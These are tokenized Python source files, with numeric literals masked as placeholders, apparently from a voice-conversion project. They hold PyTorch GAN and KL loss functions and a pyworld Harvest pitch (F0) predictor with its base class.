<s> import torch <EOL> def feature_loss ( fmap_r , fmap_g ) : <EOL> loss = <NUM_LIT> <EOL> for dr , dg in zip ( fmap_r , fmap_g ) : <EOL> for rl , gl in zip ( dr , dg ) : <EOL> rl = rl . float ( ) . detach ( ) <EOL> gl = gl . float ( ) <EOL> loss += torch . mean ( torch . abs ( rl - gl ) ) <EOL> return loss * <NUM_LIT> <EOL> def discriminator_loss ( disc_real_outputs , disc_generated_outputs ) : <EOL> loss = <NUM_LIT> <EOL> r_losses = [ ] <EOL> g_losses = [ ] <EOL> for dr , dg in zip ( disc_real_outputs , disc_generated_outputs ) : <EOL> dr = dr . float ( ) <EOL> dg = dg . float ( ) <EOL> r_loss = torch . mean ( ( <NUM_LIT> - dr ) ** <NUM_LIT> ) <EOL> g_loss = torch . mean ( dg ** <NUM_LIT> ) <EOL> loss += r_loss + g_loss <EOL> r_losses . append ( r_loss . item ( ) ) <EOL> g_losses . append ( g_loss . item ( ) ) <EOL> return loss , r_losses , g_losses <EOL> def generator_loss ( disc_outputs ) : <EOL> loss = <NUM_LIT> <EOL> gen_losses = [ ] <EOL> for dg in disc_outputs : <EOL> dg = dg . float ( ) <EOL> l = torch . mean ( ( <NUM_LIT> - dg ) ** <NUM_LIT> ) <EOL> gen_losses . append ( l ) <EOL> loss += l <EOL> return loss , gen_losses <EOL> def kl_loss ( z_p , logs_q , m_p , logs_p , z_mask ) : <EOL> z_p = z_p . float ( ) <EOL> logs_q = logs_q . float ( ) <EOL> m_p = m_p . float ( ) <EOL> logs_p = logs_p . float ( ) <EOL> z_mask = z_mask . float ( ) <EOL> kl = logs_p - logs_q - <NUM_LIT> <EOL> kl += <NUM_LIT> * ( ( z_p - m_p ) ** <NUM_LIT> ) * torch . exp ( - <NUM_LIT> * logs_p ) <EOL> kl = torch . sum ( kl * z_mask ) <EOL> l = kl / torch . sum ( z_mask ) <EOL> return l <EOL> </s>
<s> from infer_pack . modules . F0Predictor . F0Predictor import F0Predictor <EOL> import pyworld <EOL> import numpy as np <EOL> class HarvestF0Predictor ( F0Predictor ) : <EOL> def __init__ ( self , hop_length = <NUM_LIT> , f0_min = <NUM_LIT> , f0_max = <NUM_LIT> , sampling_rate = <NUM_LIT> ) : <EOL> self . hop_length = hop_length <EOL> self . f0_min = f0_min <EOL> self . f0_max = f0_max <EOL> self . sampling_rate = sampling_rate <EOL> def interpolate_f0 ( self , f0 ) : <EOL> data = np . reshape ( f0 , ( f0 . size , <NUM_LIT> ) ) <EOL> vuv_vector = np . zeros ( ( data . size , <NUM_LIT> ) , dtype = np . float32 ) <EOL> vuv_vector [ data > <NUM_LIT> ] = <NUM_LIT> <EOL> vuv_vector [ data <= <NUM_LIT> ] = <NUM_LIT> <EOL> ip_data = data <EOL> frame_number = data . size <EOL> last_value = <NUM_LIT> <EOL> for i in range ( frame_number ) : <EOL> if data [ i ] <= <NUM_LIT> : <EOL> j = i + <NUM_LIT> <EOL> for j in range ( i + <NUM_LIT> , frame_number ) : <EOL> if data [ j ] > <NUM_LIT> : <EOL> break <EOL> if j < frame_number - <NUM_LIT> : <EOL> if last_value > <NUM_LIT> : <EOL> step = ( data [ j ] - data [ i - <NUM_LIT> ] ) / float ( j - i ) <EOL> for k in range ( i , j ) : <EOL> ip_data [ k ] = data [ i - <NUM_LIT> ] + step * ( k - i + <NUM_LIT> ) <EOL> else : <EOL> for k in range ( i , j ) : <EOL> ip_data [ k ] = data [ j ] <EOL> else : <EOL> for k in range ( i , frame_number ) : <EOL> ip_data [ k ] = last_value <EOL> else : <EOL> ip_data [ i ] = data [ i ] <EOL> last_value = data [ i ] <EOL> return ip_data [ : , <NUM_LIT> ] , vuv_vector [ : , <NUM_LIT> ] <EOL> def resize_f0 ( self , x , target_len ) : <EOL> source = np . array ( x ) <EOL> source [ source < <NUM_LIT> ] = np . nan <EOL> target = np . interp ( <EOL> np . arange ( <NUM_LIT> , len ( source ) * target_len , len ( source ) ) / target_len , <EOL> np . arange ( <NUM_LIT> , len ( source ) ) , <EOL> source , <EOL> ) <EOL> res = np . nan_to_num ( target ) <EOL> return res <EOL> def compute_f0 ( self , wav , p_len = None ) : <EOL> if p_len is None : <EOL> p_len = wav . shape [ <NUM_LIT> ] // self . hop_length <EOL> f0 , t = pyworld . harvest ( <EOL> wav . astype ( np . double ) , <EOL> fs = self . sampling_rate , <EOL> f0_ceil = self . f0_max , <EOL> f0_floor = self . f0_min , <EOL> frame_period = <NUM_LIT> * self . hop_length / self . sampling_rate , <EOL> ) <EOL> f0 = pyworld . stonemask ( wav . astype ( np . double ) , f0 , t , self . fs ) <EOL> return self . interpolate_f0 ( self . resize_f0 ( f0 , p_len ) ) [ <NUM_LIT> ] <EOL> def compute_f0_uv ( self , wav , p_len = None ) : <EOL> if p_len is None : <EOL> p_len = wav . shape [ <NUM_LIT> ] // self . hop_length <EOL> f0 , t = pyworld . harvest ( <EOL> wav . astype ( np . double ) , <EOL> fs = self . sampling_rate , <EOL> f0_floor = self . f0_min , <EOL> f0_ceil = self . f0_max , <EOL> frame_period = <NUM_LIT> * self . hop_length / self . sampling_rate , <EOL> ) <EOL> f0 = pyworld . stonemask ( wav . astype ( np . double ) , f0 , t , self . sampling_rate ) <EOL> return self . interpolate_f0 ( self . resize_f0 ( f0 , p_len ) ) <EOL> </s>
<s> class F0Predictor ( object ) : <EOL> def compute_f0 ( self , wav , p_len ) : <EOL> pass <EOL> def compute_f0_uv ( self , wav , p_len ) : <EOL> pass <EOL> </s>
